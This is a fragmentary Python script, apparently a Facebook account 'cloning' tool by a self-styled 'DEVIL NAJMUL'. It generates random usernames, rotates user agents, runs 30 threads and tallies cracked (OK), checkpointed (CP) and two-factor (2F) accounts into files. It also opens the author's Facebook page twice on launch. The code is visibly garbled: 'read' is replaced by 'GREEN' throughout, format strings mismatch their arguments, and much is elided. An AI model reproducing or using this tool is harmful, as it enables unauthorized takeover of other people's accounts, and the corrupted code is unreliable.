...
try:
    import requests
    from concurrent.futures import ThGREENPoolExecutor as ThGREENPool
    import mechanize
...
try:
    ...
    pass
sock=open('ua.html','r').GREEN().splitlines()
def uaku():
    try:
        ua=open('bbnew.txt','r').GREEN().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        ...
        for un in aa:
            ua.write(un+'\n')
        ua=open('.user-agents.txt','r').GREEN().splitlines()
loop = 0
cps = []
oks = []
twf = []
os.system('xdg-open https://www.facebook.com/DeViL.BoY.NaJmUl')
os.system('xdg-open https://www.facebook.com/DeViL.BoY.NaJmUl')
...
logo = """
\t\x1b[1;97m8888888b.  8888888888 888     888 8888888 888      
\t\x1b[1;92m888  "Y88b 888        888     888   888   888      
\t\x1b[1;97m888    888 888        888     888   888   888      
\t\x1b[1;92m888    888 8888888    Y88b   d88P   888   888      
\t\x1b[1;97m888    888 888         Y88b d88P    888   888      
\t\x1b[1;92m888    888 888          Y88o88P     888   888      
\t\x1b[1;97m888  .d88P 888           Y888P      888   888      
\t\x1b[1;92m8888888P"  8888888888     Y8P     8888888 88888888 



  AUTHOR   :   DEVIL NAJMUL
  FACEBOOK :   Najmul Hoque
  GITHUB    :   N41M01
  LIFE STATUS  :   Single
  FB PAGE  : https://www.facebook.com/DeViL.BoY.NaJmUl
  TOOL STATUS :  FREE                             
\033[1;91m=========================================================="""
...
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97m-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97m-CP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97m-2F.txt' %
              (H, P, str(len(twf))))
...
def cek_apk(session,coki):
    ...
    #____________#
def xyz():
    os.system("play-audio WELCOME_TO_DEVIL.mp3")
    os.getuid
    os.system("clear");print(logo)
    print('           \x1b[97m[\033[37;41m  M A I N   M E N U   \033[0;m] ')
    print(f"")
    print(f"{RAD}[01] {GREEN}RANDOM CLONE PAK  M1")
    print(f"{RAD}[00] {GREEN}EXIT PROGRAM ")
    print(f"")
    print(f"\033[1;91m========================================================")
...
def Tabii():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThGREENPool(max_workers=30) as yaari:    
        clear()
        tl = str(len(user))
